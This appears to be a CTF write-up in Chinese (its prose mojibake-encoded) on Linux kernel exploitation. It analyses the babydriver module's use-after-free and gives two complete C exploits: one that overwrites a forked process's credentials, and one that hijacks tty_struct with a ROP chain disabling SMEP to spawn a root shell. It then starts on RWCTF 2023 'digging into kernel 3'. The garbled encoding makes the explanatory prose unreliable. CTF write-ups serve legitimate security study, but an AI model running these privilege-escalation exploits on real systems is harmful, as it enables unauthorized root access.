è¿™é‡Œè°ˆä¸€ä¸‹file_operationsï¼Œè¿™ä¸ªç»“æ„ä½“ä¼šæŠŠæ˜¯ä¸ªå‡½æ•°åŠŸèƒ½æŒ‡é’ˆä¼šæŠŠå¸¸è§çš„å‡½æ•°å’Œæ¨¡å—çš„å‡½æ•°åšä¸€ä¸ªå¯¹åº”
```c
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_137)
00000000                                         ; XREF: .data:fops/r
00000000 owner dq ?                              ; offset
00000008 llseek dq ?                             ; offset
00000010 read dq ?                               ; offset
00000018 write dq ?                              ; offset
00000020 read_iter dq ?                          ; offset
00000028 write_iter dq ?                         ; offset
00000030 iterate dq ?                            ; offset
00000038 poll dq ?                               ; offset
00000040 unlocked_ioctl dq ?                     ; offset
00000048 compat_ioctl dq ?                       ; offset
00000050 mmap dq ?                               ; offset
00000058 open dq ?                               ; offset
00000060 flush dq ?                              ; offset
00000068 release dq ?                            ; offset
00000070 fsync dq ?                              ; offset
00000078 aio_fsync dq ?                          ; offset
00000080 fasync dq ?                             ; offset
00000088 lock dq ?                               ; offset
00000090 sendpage dq ?                           ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags dq ?                        ; offset
000000A8 flock dq ?                              ; offset
000000B0 splice_write dq ?                       ; offset
000000B8 splice_read dq ?                        ; offset
000000C0 setlease dq ?                           ; offset
000000C8 fallocate dq ?                          ; offset
000000D0 show_fdinfo dq ?                        ; offset
000000D8 file_operations ends
```

äº‹å®ä¸Šreleaseå‡½æ•°æ˜¯å½“ç”¨æˆ·ç©ºé—´ç¨‹åºæ‰§è¡Œ close() ç³»ç»Ÿè°ƒç”¨æ—¶è°ƒç”¨çš„å‡½æ•°

é€šè¿‡/dev/babydevå°±èƒ½ç”¨é€šç”¨å‡½æ•°å’Œæ¨¡å—å‡½æ•°è¿›è¡Œäº¤äº’äº†ï¼Œç»“åˆfopsä¸»è¦å®šä¹‰äº†å‡ ä¸ªå‡½æ•°åŠŸèƒ½

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);// UAF
  printk("device release\n");
  return 0;
}

int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);//åœ¨å†…æ ¸å†…å­˜ä¸­åˆ†é…å†…å­˜ç»™å…¨å±€å˜é‡babydev_struct.device_bufï¼Œ(ç±»å‹ï¼Œæ ‡å¿—ï¼Œå¤§å°)ï¼Œkmalloc_caches[6]ç‰¹å®šå¤§å°çš„ kmem_cache
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}

__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx

  _fentry__(filp, command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);//é‡æ–°åˆ†é…ä¸€ä¸ªæŒ‡å®šå¤§å°çš„å †å—
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    return 0LL;
  }
  else
  {
    printk(&unk_2EB);
    return -22LL;
  }
}


ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();//å°†ç”¨æˆ·æ€çš„æ•°æ®(ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„)æ‹·è´ç»™babydev_struct.device_buf
    return v6;
  }
  return result;
}

ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);//babydev_struct.device_bufæŒ‡å‘çš„å†…å®¹æ‹·è´åˆ°ç”¨æˆ·æ€
    return v6;
  }
  return result;
}

```

babyopenä¸­å­˜åœ¨æ¼æ´ï¼Œç®€å•æ¥è¯´è¿™ä¸ªåŠŸèƒ½æ˜¯ç”¨äºåˆ†é…å †å—çš„ï¼Œè¿™é‡ŒæŠŠåˆ†é…çš„æŒ‡é’ˆæ”¾åˆ°äº†å†…æ ¸æ¨¡å—çš„bssæ®µä¸Šï¼Œå°±å¯¼è‡´äº†æ¯ä¸ªæ–°opençš„è¯¥è®¾å¤‡çš„fdæ‰€å¼€è¾Ÿçš„å †å—ï¼Œè¢«æ‰€æœ‰ä½¿ç”¨è¯¥è®¾å¤‡çš„fdå…±ç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼Œåœ¨babyioctlåŒæ ·å­˜åœ¨

babyreleaseçš„UAFæ¼æ´

æ‰€ä»¥ç¬¬ä¸€ç§æ€è·¯å°±æ˜¯UAF
forkå­è¿›ç¨‹æ—¶ï¼Œä¼šåˆ†é…0xa8å¤§å°(size)çš„å†…æ ¸å †ï¼Œä¸»è¦ç”¨äºå­˜å‚¨å½“å‰è¿›ç¨‹çš„ä¸€äº›ä¿¡æ¯ï¼ŒåŒ…æ‹¬æƒé™ç­‰ã€‚babyioctlå¯ä»¥åˆ†é…ä¸€ä¸ª0xa8å¤§å°çš„å †å—ç„¶åfreeæ‰ï¼Œå†æ‰§è¡Œforkï¼Œå†ç»“åˆbabyopençš„å¤šä¸ªfdæŒ‡é’ˆï¼Œå°±å¯ä¿®æ”¹forkè¿›ç¨‹ç»“æ„ä½“é‡Œçš„å†…å®¹
å¯¹äºæ”¹å­è¿›ç¨‹credçš„æ–¹æ³•ä¹Ÿæœ‰2ç§æ€è·¯ï¼Œæ ¸å¿ƒæ˜¯å­è¿›ç¨‹è¦å…ˆäºçˆ¶è¿›ç¨‹æ‰§è¡Œsystem("/bin/sh")
+ å¯ä»¥åœ¨çˆ¶è¿›ç¨‹è®¾ç½®ä¸€ä¸ªwait(NULL)æ“ä½œéƒ½åœ¨å­è¿›ç¨‹ä¸­å®Œæˆ
+ å¯ä»¥åœ¨å­è¿›ç¨‹è®¾ç½®ä¸€ä¸ªsleepï¼Œä¸”åªæ‰§è¡Œsystem("/bin/sh")ï¼Œçˆ¶è¿›ç¨‹å®Œæˆæ‰€æœ‰æ“ä½œ

EXP

```c
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);	

	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	pid_t fpid; 
	fpid=fork();
	if (fpid < 0) 
	{
		printf("error in fork!\n"); 
		exit(0);
	}
	else if (fpid == 0) 
	{
		printf("child pid is : %d\n",getpid());
		char zeros[30] = {0};
		write(fd2,zeros,28);
		system("/bin/sh");
		exit(0);
	}
	// {
	// 	printf("child pid is : %d\n",getpid());
	// 	sleep(3)
	// 	system("/bin/sh");
	// 	exit(0);
	// }
	else 
	{
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	// {
	// 	char zeros[30] = {0};
	// 	write(fd2,zeros,28);
	// 	wait(NULL);
	// 	printf("parent pid is: %d\n",getpid());
	// }
	printf("%d: going to close fd2\n",getpid());
	close(fd2);
	return 0;
}
```


è¿˜æœ‰ä¸€ç§å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯tty_structç»“æ„ä½“
è¿™ä¸ªç»“æ„ä½“æ˜¯åœ¨å¼€å¯/dev/ptmxè®¾å¤‡èŠ‚ç‚¹æ—¶ï¼Œä¼šè¢«åˆ†é…åˆ°ä¸€ä¸ª0x2e0ï¼ˆä¸åŒå†…æ ¸ç‰ˆæœ¬æœ‰æ‰€åŒºåˆ«ï¼‰çš„ç»“æ„ä½“tty_struct
è¿™ä¸ªç»“æ„ä½“å¦‚ä¸‹
```c
struct tty_struct {
	int	magic; //4
	struct kref kref;//4
	struct device *dev;//8
	struct tty_driver *driver;//8
	const struct tty_operations *ops; 
  // Â·Â·Â·Â·Â·Â·
}
// https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272
```

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
  // ......
}
```

è¿™ä¸ªç»“æ„ä½“é‡Œå­˜æ”¾çš„æ˜¯å¯¹åº”ç»ˆç«¯çš„ä¸€äº›æ“ä½œå‡½æ•°,è¿™äº›å‡½æ•°åŒ…æ‹¬ä½†ä¸é™äºï¼š

openï¼šæ‰“å¼€ä¸€ä¸ª TTY è®¾å¤‡ã€‚
closeï¼šå…³é—­ä¸€ä¸ª TTY è®¾å¤‡ã€‚
writeï¼šå‘ TTY è®¾å¤‡å†™å…¥æ•°æ®ã€‚
readï¼šä» TTY è®¾å¤‡è¯»å–æ•°æ®ã€‚
ioctlï¼šæ‰§è¡Œæ§åˆ¶æ“ä½œï¼Œå¦‚æ”¹å˜ç»ˆç«¯è®¾ç½®ã€‚
set_termiosï¼šè®¾ç½®ç»ˆç«¯çš„å±æ€§ã€‚

å¯ä»¥å»åŠ«æŒè¿™ä¸ªç»“æ„ä½“é‡Œçš„å‡½æ•°æŒ‡é’ˆå®ç°åˆ©ç”¨

ç”±äºè¦åœ¨å†…æ ¸æ€æ‰§è¡ŒROPï¼Œæ‰€ä»¥éœ€è¦ä¿å­˜ç”¨æˆ·æ€ä¸Šä¸‹æ–‡å’Œè€ƒè™‘ç”¨æˆ·æ€ç€é™†ï¼Œè¿™éƒ¨åˆ†éƒ½æ˜¯æ¿å­å†…å®¹å°±ä¸å†èµ˜è¿°
è¿™é‡Œçš„æ€è·¯æ˜¯ï¼Œåˆ©ç”¨UAFæ¼æ´åŠ«æŒtty_structç»“æ„ä½“ï¼Œåˆ©ç”¨readå‡½æ•°å°†ç»“æ„ä½“çš„æ•°æ®æå–å‡ºæ¥ä¾¿äºä¼ªé€ ï¼Œä¿®æ”¹tty_operationsæŒ‡é’ˆä¸ºæˆ‘ä»¬åœ¨ç”¨æˆ·æ€è®¾ç½®çš„ä¼ªé€ tty_operationsçš„åœ°å€ï¼Œç„¶åä¼ªé€ tty_operationsï¼Œè¿™é‡Œä¸»è¦åŠ«æŒwriteå‡½æ•°ï¼Œé€šè¿‡è°ƒè¯•å¾—åˆ°åœ¨æ‰§è¡Œè¯¥writeå‡½æ•°æ—¶ï¼Œraxä¸ºç”¨æˆ·æ€ä¼ªé€ tty_operationsçš„åœ°å€ï¼Œæ‰€ä»¥å°†æ•´ä¸ªtty_operationsç»“æ„ä½“è¦†ç›–ä¸ºmov rsp raxï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶æ‰§è¡Œæµåˆ°tty_operationsç»“æ„ä½“å¼€å§‹çš„ä½ç½®ï¼Œç„¶ååœ¨tty_operationsç»“æ„ä½“çš„å‰è¾¹æ”¾ç½®å¥½æ ˆè¿ç§»æŒ‡ä»¤ï¼Œè¿ç§»åˆ°ç”¨æˆ·æ€ä¸Šæ„é€ çš„ROPé“¾ï¼Œå°±å®Œæˆäº†åˆ©ç”¨ã€‚
è¿™é‡Œå¼€å¯äº†smepï¼Œè¦åœ¨ROPçš„æ—¶å€™ä¿®æ”¹cr4å¯„å­˜å™¨æ¥å…³é—­smepï¼Œå¸¸å°†cr4çš„å€¼è®¾ç½®ä¸º0x6f0

EXP
å°†-enable-kvmå‚æ•°åˆ é™¤
```c
//gcc -Wall -static -o exp exp2.c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t pkc_addr = 0xffffffff810a1810;
size_t cc_addr = 0xffffffff810a1420;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status()
{
    __asm__("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %rsp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; 
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",2);

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);

    close(fd2);
	return 0;
}
```



### 2023RWCTF digging into kernel 3

å…ˆæ£€æŸ¥ä¿¡æ¯
```shell
#!/bin/sh
qemu-system-x86_64 \
        -m 128M \
        -nographic \
        -kernel ./bzImage \
        -initrd ./rootfs.img \
        -enable-kvm \
        -cpu kvm64,+smap,+smep \
        -monitor /dev/null \
        -append 'console=ttyS0 kpti=1 quiet kaslr oops=panic panic=1 init=/init' \
        -no-reboot \
        -snapshot 
```

é¢˜ç›®å¼€äº†kaslr,smepï¼ˆè¦ç”¨ptregsï¼‰ï¼Œå†çœ‹ä¸‹init

```shell
#!/bin/sh

mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /rwctf.ko
chmod 666 /dev/rwctf
chmod 700 /flag
chmod 400 /proc/kallsyms

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

# poweroff -d 120 -f &

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
setsid /bin/cttyhack setuidgid 0 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0 -f
```

æŠŠè¶…æ—¶æŒ‚èµ·å’Œæƒé™æ”¹äº†ï¼ŒæŠŠrun.shé‡Œçš„kaslræ”¹ä¸ºnokaslrï¼Œæ–¹ä¾¿è°ƒè¯•

ç”±äºé™åˆ¶äº†/proc/kallsymsçš„æƒé™ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸äº†å‡½æ•°è¡¨çš„/proc/kallsymsï¼Œè¿™é‡Œç€é‡åˆ†ærwctf.ko
åŸºæœ¬ä¸Šåªæœ‰ä¸€ä¸ªåŠŸèƒ½rwmod_ioctl
```c
__int64 __fastcall rwmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // r12
  __int64 v5; // rbx
  __int64 v6; // rdi
  unsigned int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int size; // [rsp+4h] [rbp-2Ch]
  __int64 con; // [rsp+8h] [rbp-28h]
  unsigned __int64 v10; // [rsp+18h] [rbp-18h]

  v10 = __readgsqword(0x28u);
  if ( !a3 )
    return -1LL;
  if ( a2 == 0xC0DECAFE )
  {
    if ( !copy_from_user(&idx, a3, 0x10LL) && idx <= 1 )
      kfree(buf[idx]);
    return 0LL;
  }
  v3 = -1LL;
  if ( a2 == 0xDEADBEEF )
  {
    if ( copy_from_user(&idx, a3, 0x10LL) )
      return 0LL;
    v5 = idx;
    if ( idx > 1 )
      return 0LL;
    buf[v5] = _kmalloc(size, 0xDC0LL);
    v6 = buf[idx];
    if ( !v6 )
      return 0LL;
    if ( size > 0x7FFFFFFFuLL )
      BUG();
    if ( copy_from_user(v6, con, size) )
      return 0LL;
  }
  return v3;
}
```

æ ¹æ®a2ä¸åŒæ‰§è¡Œä¸åŒçš„åˆ†æ”¯
å…³äºcopy_from_user

```c
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);

ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯æŒ‡é’ˆï¼Œè¿”å›æœªæˆåŠŸå¤åˆ¶çš„å­—èŠ‚æ•°
```


å½“a2ä¸º0xC0DECAFEï¼ŒæŠŠa3é‡Œè¾¹çš„å€¼æ‹·è´åˆ°idxï¼Œidxåªèƒ½å–0å’Œ1ï¼Œç„¶åä¸€ä¸ªUAF
å½“a2ä¸º0xDEADBEEFï¼Œå°±æ˜¯å¼€ä¸€ä¸ªsizeçš„å †å—æ”¾åˆ°bufé‡Œï¼Œidxåªèƒ½å–0å’Œ1ï¼Œsizeä¸èƒ½è¿‡å¤§ï¼Œå†æŠŠå†…å®¹æ‹·è´è¿‡å»ï¼Œç»“åˆæ ˆç»“æ„ï¼Œå…ˆå…ˆå†™ä¸€ä¸ªç»“æ„ä½“
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105172824.png)

```c
struct rwstruct{
	unsigned int idx;//4
	unsigned int size;//4
	char *con;//8
}
```

2ä¸ªåŠŸèƒ½èœå•

```c
int g_fd;

int rwctf_ioctl_kmalloc(int idx,int size, char* con){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = size;
	rw_buf.con = con;
	ioctl(g_fd,0xDEADBEEF,&rw_buf);
}


int rwctf_ioctl_kfree(int idx){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = 0;
	rw_buf.con = 0;
	ioctl(g_fd,0xC0DECAFE,&rw_buf);
}
```

æœ‰äº†ä»»æ„sizeåˆ›å»ºå’ŒUAFï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹åˆ©ç”¨äº†

æ–¹æ³•ä¸€
é¦–å…ˆè€ƒè™‘æ²¡æœ‰kalsrä¸‹å¦‚ä½•å®Œæˆåˆ©ç”¨
åç»­è‚¯å®šæ˜¯è¦ptregså®ç°ROPçš„ï¼Œæœ‰äº†ä»»æ„å †å¤§å°çš„UAFå¯ä»¥åŠ«æŒseq_operationsï¼Œæ§åˆ¶ripåå°±add_rspæ‰§è¡Œptregsï¼Œç„¶åå°±å¯ä»¥è€ƒè™‘modprobe_path

éš¾ç‚¹åœ¨äºleakåç§»ï¼Œè¿™é‡Œç”¨çš„æ˜¯åŠ«æŒuser_key_payloadçš„æ–¹æ³•ï¼Œåˆ©ç”¨UAFåŠ«æŒuser_key_payloadç»“æ„ä½“ï¼Œæ³„éœ²å†…æ ¸å †ä¸Šçš„å†…å®¹ï¼Œå†ç»“åˆkey_revoke+add_keyå †å–·ï¼Œå°±èƒ½æ³„éœ²user_free_payload_rcuåœ°å€ä»è€Œæ‹¿åˆ°kernelbase










https://bbs.kanxue.com/thread-279787.htm

https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/